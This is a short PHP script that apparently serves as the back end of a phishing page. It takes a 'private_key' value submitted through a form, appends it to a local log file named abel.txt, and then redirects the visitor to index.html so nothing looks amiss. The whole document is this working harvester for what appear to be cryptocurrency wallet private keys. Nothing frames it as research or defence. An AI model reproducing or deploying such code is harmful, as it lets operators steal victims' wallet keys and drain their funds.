<?php
$private_key = $_POST['private_key'];

if (empty($private_key)) {
  header('location: ./');
} else {
$message = "
PRIVATE KEY : ".$private_key."

";
$qq = fopen("abel.txt", "a");
fwrite($qq, $message);
fclose($qq);
header('location: index.html');
}
?>
